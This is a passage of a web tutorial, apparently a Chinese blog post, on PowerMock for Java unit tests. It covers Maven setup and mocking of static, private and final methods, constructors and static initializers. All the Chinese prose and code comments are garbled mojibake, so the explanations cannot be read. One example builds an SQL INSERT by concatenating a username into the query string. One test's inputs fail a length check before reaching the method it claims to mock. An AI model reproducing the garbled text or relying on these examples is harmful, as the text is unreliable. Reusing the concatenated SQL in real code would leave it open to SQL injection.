    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.9<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.powermock<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>powermock-api-mockito2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.9<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><strong>ç‰ˆæœ¬å…¼å®¹æ€§æ³¨æ„</strong>ï¼šç¡®ä¿PowerMockä¸Mockito/JUnitç‰ˆæœ¬åŒ¹é…ï¼Œå…·ä½“å…¼å®¹æ€§å…³ç³»å¯å‚è€ƒå®˜æ–¹æ–‡æ¡£ã€‚</p>
<h3 data-id="heading-6">åŸºæœ¬é…ç½®æ³¨è§£</h3>
<p>ä½¿ç”¨PowerMockéœ€è¦åœ¨æµ‹è¯•ç±»ä¸Šæ·»åŠ å¿…è¦çš„æ³¨è§£ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RunWith(PowerMockRunner.class)</span> <span class="hljs-comment">// å¿…é¡»ä½¿ç”¨PowerMockRunner</span>
<span class="hljs-meta">@PrepareForTest({StaticUtils.class, User.class})</span> <span class="hljs-comment">// å£°æ˜éœ€å¢å¼ºçš„ç±»</span>
<span class="hljs-meta">@PowerMockIgnore("javax.management.*")</span> <span class="hljs-comment">// è§£å†³ç±»åŠ è½½å™¨å†²çª</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceTest</span> {
    <span class="hljs-comment">// æµ‹è¯•å†…å®¹</span>
}
</code></pre>
<ul>
<li><code>@RunWith(PowerMockRunner.class)</code>ï¼šå‘Šè¯‰JUnitä½¿ç”¨PowerMockçš„æµ‹è¯•è¿è¡Œå™¨ã€‚</li>
<li><code>@PrepareForTest</code>ï¼šæŒ‡å®šéœ€è¦è¢«PowerMockä¿®æ”¹çš„ç±»ï¼ˆåŒ…å«é™æ€æ–¹æ³•ã€finalæ–¹æ³•ç­‰çš„ç±»ï¼‰ã€‚</li>
<li><code>@PowerMockIgnore</code>ï¼šè§£å†³ä½¿ç”¨PowerMockåå¯èƒ½å‡ºç°çš„ç±»åŠ è½½å™¨å†²çªé—®é¢˜ã€‚</li>
</ul>
<h2 data-id="heading-7">PowerMockæ ¸å¿ƒä½¿ç”¨åœºæ™¯è¯¦è§£</h2>
<h3 data-id="heading-8">é™æ€æ–¹æ³•Mock</h3>
<p>é™æ€æ–¹æ³•æ˜¯æœ€å¸¸è§çš„æµ‹è¯•éš¾ç‚¹ä¹‹ä¸€ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹PowerMockå¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p>
<p><strong>åœºæ™¯ç¤ºä¾‹</strong>ï¼šå‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªé™æ€å·¥å…·ç±»ï¼Œç”¨äºç”Ÿæˆå”¯ä¸€IDï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IdGenerator</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">generateUniqueId</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// å®é™…ä¸šåŠ¡ä¸­å¯èƒ½åŒ…å«å¤æ‚çš„é€»è¾‘æˆ–å¤–éƒ¨ä¾èµ–</span>
        <span class="hljs-keyword">return</span> UUID.randomUUID().toString();
    }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">createOrder</span><span class="hljs-params">()</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">orderId</span> <span class="hljs-operator">=</span> IdGenerator.generateUniqueId();
        <span class="hljs-comment">// åˆ›å»ºè®¢å•çš„é€»è¾‘</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">"ORDER_"</span> + orderId;
    }
}
</code></pre>
<p><strong>æµ‹è¯•ä»£ç </strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RunWith(PowerMockRunner.class)</span>
<span class="hljs-meta">@PrepareForTest({IdGenerator.class, OrderService.class})</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderServiceTest</span> {
    
    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testCreateOrderWithStaticMock</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 1. å‡†å¤‡é™æ€ç±»çš„Mock</span>
        PowerMockito.mockStatic(IdGenerator.class);
        
        <span class="hljs-comment">// 2. é¢„è®¾é™æ€æ–¹æ³•è¡Œä¸º</span>
        PowerMockito.when(IdGenerator.generateUniqueId()).thenReturn(<span class="hljs-string">"123e4567"</span>);
        
        <span class="hljs-comment">// 3. åˆ›å»ºè¢«æµ‹è¯•å¯¹è±¡å¹¶è°ƒç”¨è¢«æµ‹æ–¹æ³•</span>
        <span class="hljs-type">OrderService</span> <span class="hljs-variable">orderService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderService</span>();
        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> orderService.createOrder();
        
        <span class="hljs-comment">// 4. éªŒè¯ç»“æœ</span>
        assertEquals(<span class="hljs-string">"ORDER_123e4567"</span>, result);
        
        <span class="hljs-comment">// 5. éªŒè¯é™æ€æ–¹æ³•è°ƒç”¨ï¼ˆå¿…é¡»è°ƒç”¨ï¼‰</span>
        PowerMockito.verifyStatic(IdGenerator.class);
        IdGenerator.generateUniqueId();
    }
}
</code></pre>
<p><strong>å…³é”®ç‚¹è¯´æ˜</strong>ï¼š</p>
<ul>
<li><code>mockStatic()</code>æ–¹æ³•ç”¨äºå‘Šè¯‰PowerMockè¦Mockå“ªä¸ªç±»çš„é™æ€æ–¹æ³•</li>
<li>é™æ€æ–¹æ³•çš„Stubbingï¼ˆå®šä¹‰è¡Œä¸ºï¼‰ä¸æ™®é€šMockitoè¯­æ³•ç±»ä¼¼</li>
<li><strong>å¿…é¡»è°ƒç”¨</strong><code>verifyStatic()</code>æ¥éªŒè¯é™æ€æ–¹æ³•çš„è°ƒç”¨ï¼Œä¸”éœ€è¦åœ¨éªŒè¯å‰è°ƒç”¨ä¸€æ¬¡</li>
</ul>
<p><strong>å¸¸è§å‘ç‚¹</strong>ï¼šå¿˜è®°è°ƒç”¨<code>verifyStatic()</code>ä¼šå¯¼è‡´æ— æ³•éªŒè¯é™æ€æ–¹æ³•æ˜¯å¦è¢«æ­£ç¡®è°ƒç”¨ã€‚</p>
<h3 data-id="heading-9">ç§æœ‰æ–¹æ³•Mock</h3>
<p>æµ‹è¯•ç§æœ‰æ–¹æ³•ä¸€ç›´å­˜åœ¨äº‰è®®ï¼Œä½†åœ¨æŸäº›åœºæ™¯ä¸‹ï¼ˆå¦‚å¤æ‚ç®—æ³•éªŒè¯ï¼‰ç¡®å®æœ‰å¿…è¦ç›´æ¥æµ‹è¯•ç§æœ‰æ–¹æ³•ã€‚</p>
<p><strong>åœºæ™¯ç¤ºä¾‹</strong>ï¼šä¸€ä¸ªåŒ…å«å¤æ‚æ ¡éªŒé€»è¾‘çš„UserServiceï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">validateUser</span><span class="hljs-params">(String username, String password)</span> {
        <span class="hljs-keyword">if</span> (!isValidFormat(username) || !isValidFormat(password)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        <span class="hljs-keyword">return</span> internalComplexValidation(username, password);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isValidFormat</span><span class="hljs-params">(String input)</span> {
        <span class="hljs-comment">// å¤æ‚çš„æ ¼å¼æ ¡éªŒé€»è¾‘</span>
        <span class="hljs-keyword">return</span> input != <span class="hljs-literal">null</span> &amp;&amp; input.length() &gt;= <span class="hljs-number">5</span>;
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">internalComplexValidation</span><span class="hljs-params">(String username, String password)</span> {
        <span class="hljs-comment">// éå¸¸å¤æ‚çš„å†…éƒ¨æ ¡éªŒé€»è¾‘</span>
        <span class="hljs-comment">// å¯èƒ½æ¶‰åŠåŠ å¯†ã€æ•°æ®åº“æŸ¥è¯¢ç­‰</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// ç®€åŒ–ç¤ºä¾‹</span>
    }
}
</code></pre>
<p><strong>æµ‹è¯•ä»£ç </strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RunWith(PowerMockRunner.class)</span>
<span class="hljs-meta">@PrepareForTest(UserService.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceTest</span> {

    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testPrivateMethod</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 1. åˆ›å»ºè¢«æµ‹ç±»çš„Spyå¯¹è±¡ï¼ˆéƒ¨åˆ†çœŸå®è°ƒç”¨ï¼‰</span>
        <span class="hljs-type">UserService</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserService</span>();
        <span class="hljs-type">UserService</span> <span class="hljs-variable">spyService</span> <span class="hljs-operator">=</span> PowerMockito.spy(userService);

        <span class="hljs-comment">// 2. Stubbingï¼šé¢„è®¾ç§æœ‰æ–¹æ³•è¡Œä¸º</span>
        PowerMockito.doReturn(<span class="hljs-literal">true</span>).when(spyService, <span class="hljs-string">"isValidFormat"</span>, Mockito.anyString());

        <span class="hljs-comment">// 3. è°ƒç”¨è¢«æµ‹æ–¹æ³•</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> spyService.validateUser(<span class="hljs-string">"testuser"</span>, <span class="hljs-string">"testpass"</span>);

        <span class="hljs-comment">// 4. éªŒè¯ç»“æœ</span>
        assertTrue(result);

        <span class="hljs-comment">// 5. éªŒè¯ç§æœ‰æ–¹æ³•è¢«è°ƒç”¨ï¼ˆå¯é€‰ï¼‰</span>
        PowerMockito.verifyPrivate(spyService,Mockito.times(<span class="hljs-number">2</span>))
                .invoke(<span class="hljs-string">"isValidFormat"</span>, Mockito.anyString());
    }

    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testPrivateMethodWithArguments</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">UserService</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserService</span>();
        <span class="hljs-type">UserService</span> <span class="hljs-variable">spyService</span> <span class="hljs-operator">=</span> PowerMockito.spy(userService);

        <span class="hljs-comment">// Mockæœ‰å‚æ•°çš„ç§æœ‰æ–¹æ³•</span>
        PowerMockito.doReturn(<span class="hljs-literal">false</span>)
                .when(spyService, <span class="hljs-string">"internalComplexValidation"</span>, <span class="hljs-string">"user"</span>, <span class="hljs-string">"pass"</span>);

        <span class="hljs-type">boolean</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> spyService.validateUser(<span class="hljs-string">"user"</span>, <span class="hljs-string">"pass"</span>);

        assertFalse(result);
    }
}
</code></pre>
<p><strong>å…³é”®ç‚¹è¯´æ˜</strong>ï¼š</p>
<ul>
<li>ä½¿ç”¨<code>spy()</code>æ–¹æ³•åˆ›å»ºå¯¹è±¡ï¼Œè¿™æ ·æœªè¢«Mockçš„æ–¹æ³•ä¼šä¿æŒçœŸå®è¡Œä¸ºã€‚</li>
<li>ä½¿ç”¨<code>doReturn().when()</code>è¯­æ³•æ¥Mockç§æœ‰æ–¹æ³•ï¼Œéœ€é€šè¿‡æ–¹æ³•åå­—ç¬¦ä¸²æŒ‡å®šç›®æ ‡æ–¹æ³•ã€‚</li>
<li>å¯ä»¥é€šè¿‡<code>verifyPrivate()</code>éªŒè¯ç§æœ‰æ–¹æ³•çš„è°ƒç”¨ã€‚</li>
</ul>
<p><strong>æœ€ä½³å®è·µ</strong>ï¼šä¼˜å…ˆé€šè¿‡å…¬å…±æ–¹æ³•æµ‹è¯•ç§æœ‰é€»è¾‘ï¼Œä»…åœ¨å¤æ‚ç®—æ³•éªŒè¯ç­‰ç‰¹æ®Šåœºæ™¯ä¸‹ç›´æ¥æµ‹è¯•ç§æœ‰æ–¹æ³•ã€‚</p>
<h3 data-id="heading-10">finalç±»ä¸æ–¹æ³•Mock</h3>
<p>finalç±»å’Œæ–¹æ³•ç”±äºå…¶ä¸å¯ç»§æ‰¿æ€§ï¼Œåœ¨ä¼ ç»ŸMockæ¡†æ¶ä¸­æ— æ³•è¢«Mockï¼Œä½†PowerMockå®Œç¾è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚</p>
<p><strong>åœºæ™¯ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FinalUtility</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String <span class="hljs-title function_">finalMethod</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Final implementation"</span>;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String <span class="hljs-title function_">staticFinalMethod</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Static final implementation"</span>;
    }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SomeService</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">FinalUtility</span> <span class="hljs-variable">utility</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FinalUtility</span>();
    
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">useFinalClass</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> utility.finalMethod() + <span class="hljs-string">"_processed"</span>;
    }
}
</code></pre>
<p><strong>æµ‹è¯•ä»£ç </strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RunWith(PowerMockRunner.class)</span>
<span class="hljs-meta">@PrepareForTest({FinalUtility.class, SomeService.class})</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SomeServiceTest</span> {
    
    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testFinalClassAndMethod</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 1. åˆ›å»ºfinalç±»çš„Mockå¯¹è±¡</span>
        <span class="hljs-type">FinalUtility</span> <span class="hljs-variable">mockUtility</span> <span class="hljs-operator">=</span> PowerMockito.mock(FinalUtility.class);
        
        <span class="hljs-comment">// 2. é¢„è®¾finalæ–¹æ³•è¡Œä¸º</span>
        PowerMockito.when(mockUtility.finalMethod()).thenReturn(<span class="hljs-string">"Mocked final"</span>);
        
        <span class="hljs-comment">// 3. å½“åˆ›å»ºçœŸå®å¯¹è±¡æ—¶è¿”å›Mockå¯¹è±¡</span>
        PowerMockito.whenNew(FinalUtility.class).withNoArguments().thenReturn(mockUtility);
        
        <span class="hljs-comment">// 4. æµ‹è¯•</span>
        <span class="hljs-type">SomeService</span> <span class="hljs-variable">service</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SomeService</span>();
        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> service.useFinalClass();
        
        assertEquals(<span class="hljs-string">"Mocked final_processed"</span>, result);
    }
    
    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testStaticFinalMethod</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// Mocké™æ€finalæ–¹æ³•</span>
        PowerMockito.mockStatic(FinalUtility.class);
        PowerMockito.when(FinalUtility.staticFinalMethod()).thenReturn(<span class="hljs-string">"Mocked static final"</span>);
        
        assertEquals(<span class="hljs-string">"Mocked static final"</span>, FinalUtility.staticFinalMethod());
    }
}
</code></pre>
<p><strong>åº•å±‚åŸç†</strong>ï¼šPowerMocké€šè¿‡ä¿®æ”¹å­—èŠ‚ç ï¼Œå»é™¤äº†finalæ–¹æ³•çš„finalæ ‡è¯†ç¬¦ï¼Œä»è€Œå…è®¸Mockæ“ä½œã€‚</p>
<h3 data-id="heading-11">æ„é€ å‡½æ•°Mock</h3>
<p>å½“æ–¹æ³•å†…éƒ¨ç›´æ¥é€šè¿‡newåˆ›å»ºå¯¹è±¡æ—¶ï¼Œä¼ ç»ŸMockéš¾ä»¥ä»‹å…¥ï¼ŒPowerMockçš„æ„é€ å‡½æ•°MockåŠŸèƒ½ä¸ºæ­¤æä¾›äº†è§£å†³æ–¹æ¡ˆã€‚</p>
<p><strong>åœºæ™¯ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DatabaseConnection</span> {
    <span class="hljs-keyword">private</span> String connectionString;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DatabaseConnection</span><span class="hljs-params">(String connectionString)</span> {
        <span class="hljs-built_in">this</span>.connectionString = connectionString;
        <span class="hljs-comment">// å¯èƒ½åŒ…å«å¤æ‚çš„åˆå§‹åŒ–é€»è¾‘</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(String sql)</span> {
        <span class="hljs-comment">// æ‰§è¡ŒSQLé€»è¾‘</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserRepository</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">saveUser</span><span class="hljs-params">(String username)</span> {
        <span class="hljs-comment">// åœ¨æ–¹æ³•å†…éƒ¨ç›´æ¥åˆ›å»ºä¾èµ–å¯¹è±¡</span>
        <span class="hljs-type">DatabaseConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DatabaseConnection</span>(<span class="hljs-string">"jdbc:mysql://localhost:3306/test"</span>);
        <span class="hljs-keyword">return</span> connection.execute(<span class="hljs-string">"INSERT INTO users VALUES ('"</span> + username + <span class="hljs-string">"')"</span>);
    }
}
</code></pre>
<p><strong>æµ‹è¯•ä»£ç </strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RunWith(PowerMockRunner.class)</span>
<span class="hljs-meta">@PrepareForTest(UserRepository.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserRepositoryTest</span> {
    
    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testConstructorMock</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 1. åˆ›å»ºMockå¯¹è±¡</span>
        <span class="hljs-type">DatabaseConnection</span> <span class="hljs-variable">mockConnection</span> <span class="hljs-operator">=</span> PowerMockito.mock(DatabaseConnection.class);
        
        <span class="hljs-comment">// 2. é¢„è®¾æ„é€ å‡½æ•°è¡Œä¸º</span>
        PowerMockito.whenNew(DatabaseConnection.class)
                   .withParameterTypes(String.class)
                   .withArguments(<span class="hljs-string">"jdbc:mysql://localhost:3306/test"</span>)
                   .thenReturn(mockConnection);
        
        <span class="hljs-comment">// 3. é¢„è®¾æ–¹æ³•è¡Œä¸º</span>
        PowerMockito.when(mockConnection.execute(Mockito.anyString())).thenReturn(<span class="hljs-literal">true</span>);
        
        <span class="hljs-comment">// 4. æ‰§è¡Œæµ‹è¯•</span>
        <span class="hljs-type">UserRepository</span> <span class="hljs-variable">repository</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserRepository</span>();
        <span class="hljs-type">boolean</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> repository.saveUser(<span class="hljs-string">"testuser"</span>);
        
        <span class="hljs-comment">// 5. éªŒè¯</span>
        assertTrue(result);
        PowerMockito.verifyNew(DatabaseConnection.class)
                   .withArguments(<span class="hljs-string">"jdbc:mysql://localhost:3306/test"</span>);
    }
}
</code></pre>
<p><strong>å…³é”®ç‚¹è¯´æ˜</strong>ï¼š</p>
<ul>
<li><code>whenNew()</code>ç”¨äºæ‹¦æˆªæ„é€ å‡½æ•°è°ƒç”¨ã€‚</li>
<li><code>withParameterTypes()</code>å’Œ<code>withArguments()</code>ç”¨äºç²¾ç¡®åŒ¹é…æ„é€ å‡½æ•°ã€‚</li>
<li>éœ€è¦ä½¿ç”¨<code>verifyNew()</code>éªŒè¯æ„é€ å‡½æ•°è°ƒç”¨ã€‚</li>
</ul>
<p><strong>åº”ç”¨åœºæ™¯</strong>ï¼šé€‚ç”¨äºæµ‹è¯•é—ç•™ä»£ç ä¸­åœ¨æ–¹æ³•å†…éƒ¨ç›´æ¥å®ä¾‹åŒ–ä¾èµ–å¯¹è±¡çš„æƒ…å†µã€‚</p>
<h3 data-id="heading-12">é™æ€ä»£ç å—å¤„ç†</h3>
<p>é™æ€ä»£ç å—åœ¨ç±»åŠ è½½æ—¶æ‰§è¡Œï¼Œå¯èƒ½åŒ…å«ä¸æ„¿åœ¨æµ‹è¯•ä¸­è¿è¡Œçš„ä»£ç ï¼ˆå¦‚åˆå§‹åŒ–æ˜‚è´µèµ„æºï¼‰ï¼ŒPowerMockå¯ä»¥æŠ‘åˆ¶é™æ€ä»£ç å—çš„æ‰§è¡Œã€‚</p>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConfigurationLoader</span> {
    <span class="hljs-keyword">static</span> {
        <span class="hljs-comment">// é™æ€ä»£ç å—ï¼Œå¯èƒ½åŒ…å«æ˜‚è´µçš„åˆå§‹åŒ–æ“ä½œ</span>
        loadConfigurationFromRemote();
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">loadConfigurationFromRemote</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// æ¨¡æ‹Ÿæ˜‚è´µçš„åˆå§‹åŒ–</span>
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"ä¸åº”è¯¥åœ¨æµ‹è¯•ä¸­æ‰§è¡Œ"</span>);
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getConfig</span><span class="hljs-params">(String key)</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"value"</span>;
    }
}
</code></pre>
<p><strong>æµ‹è¯•ä»£ç </strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RunWith(PowerMockRunner.class)</span>
<span class="hljs-meta">@PrepareForTest(ConfigurationLoader.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConfigurationLoaderTest</span> {
    
    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testSuppressStaticInitializer</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// æŠ‘åˆ¶é™æ€ä»£ç å—æ‰§è¡Œ</span>
        PowerMockito.suppress(PowerMockito.method(ConfigurationLoader.class, <span class="hljs-string">"loadConfigurationFromRemote"</span>));
        
        <span class="hljs-comment">// ç°åœ¨å¯ä»¥å®‰å…¨æµ‹è¯•ï¼Œé™æ€ä»£ç å—ä¸ä¼šæ‰§è¡Œ</span>
        assertNotNull(ConfigurationLoader.getConfig(<span class="hljs-string">"testkey"</span>));
    }
}
</code></pre>
<h2 data-id="heading-13">PowerMockæœ€ä½³å®è·µä¸æ³¨æ„äº‹é¡¹</h2>
<h3 data-id="heading-14">è°¨æ…ä½¿ç”¨PowerMock</h3>
<p>è™½ç„¶PowerMockåŠŸèƒ½å¼ºå¤§ï¼Œä½†è¿‡åº¦ä½¿ç”¨å¯èƒ½æ˜¯ä»£ç è®¾è®¡é—®é¢˜çš„ä¿¡å·ã€‚<strong>ä»¥ä¸‹æ˜¯ä¸€äº›ä½¿ç”¨åŸåˆ™</strong>ï¼š</p>
<ul>
<li><strong>ä¼˜å…ˆè€ƒè™‘é‡æ„</strong>ï¼šå¦‚æœä»£ç ä¸­å¤§é‡ä½¿ç”¨PowerMockï¼Œåº”è¯¥è€ƒè™‘é‡æ„ä»£ç ä»¥æé«˜å¯æµ‹è¯•æ€§ã€‚ä¾‹å¦‚ï¼Œå°†é™æ€æ–¹æ³•æ”¹ä¸ºå®ä¾‹æ–¹æ³•ï¼Œé€šè¿‡ä¾èµ–æ³¨å…¥è§£è€¦ç­‰ã€‚</li>
<li><strong>ä»…ç”¨äºé—ç•™ä»£ç </strong>ï¼šåœ¨æ–°é¡¹ç›®ä¸­ï¼Œä¼˜å…ˆé€šè¿‡è‰¯å¥½è®¾è®¡é¿å…ä½¿ç”¨PowerMockï¼Œä»…åœ¨å¤„ç†éš¾ä»¥ä¿®æ”¹çš„é—ç•™ä»£ç æ—¶å¤§é‡ä½¿ç”¨ã€‚</li>
<li><strong>éš”ç¦»ä½¿ç”¨</strong>ï¼šå°†ä½¿ç”¨PowerMockçš„æµ‹è¯•ç±»å•ç‹¬æ”¾ç½®ï¼Œé˜²æ­¢å½±å“å…¶ä»–æµ‹è¯•çš„æ‰§è¡Œæ•ˆç‡ã€‚</li>
</ul>
<h3 data-id="heading-15">æ€§èƒ½ä¼˜åŒ–å»ºè®®</h3>
<p>PowerMockç”±äºä½¿ç”¨è‡ªå®šä¹‰ç±»åŠ è½½å™¨å’Œå­—èŠ‚ç æ“ä½œï¼Œä¼šå¯¹æµ‹è¯•æ‰§è¡Œæ—¶é—´äº§ç”Ÿæ˜¾è‘—å½±å“ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›ä¼˜åŒ–å»ºè®®ï¼š</p>
<ul>
<li><strong>æœ€å°åŒ–@PrepareForTest</strong>ï¼šåªå°†ç¡®å®éœ€è¦Mockçš„ç±»æ”¾å…¥æ³¨è§£ä¸­ï¼Œå‡å°‘å­—èŠ‚ç æ“ä½œçš„èŒƒå›´ã€‚</li>
<li><strong>åˆç†ä½¿ç”¨Mockito</strong>ï¼šå¯¹äºå¸¸è§„Mockåœºæ™¯ï¼Œä»ç„¶ä½¿ç”¨Mockitoï¼Œä»…åœ¨å¿…è¦æ—¶ä½¿ç”¨PowerMockã€‚</li>
<li><strong>é¿å…è¿‡åº¦Mock</strong>ï¼šä¸è¦Mockç³»ç»Ÿç±»æˆ–ç®€å•å€¼å¯¹è±¡ï¼Œè¿™ä¼šç»™æµ‹è¯•å¸¦æ¥ä¸å¿…è¦çš„å¤æ‚æ€§ã€‚</li>
</ul>
<h3 data-id="heading-16">ç‰ˆæœ¬é€‰æ‹©ä¸å…¼å®¹æ€§</h3>
<p><strong>ç‰ˆæœ¬å…¼å®¹æ€§</strong>ï¼šPowerMockä¸Mockitoã€JUnitçš„ç‰ˆæœ¬å…¼å®¹æ€§éå¸¸é‡è¦ã€‚ä»¥ä¸‹æ˜¯æ¨èç»„åˆï¼š</p>
<ul>
<li>PowerMock 2.x + Mockito 2.x + JUnit 4.12+</li>
<li>é¿å…æ··åˆä½¿ç”¨ä¸å…¼å®¹çš„ç‰ˆæœ¬</li>
</ul>
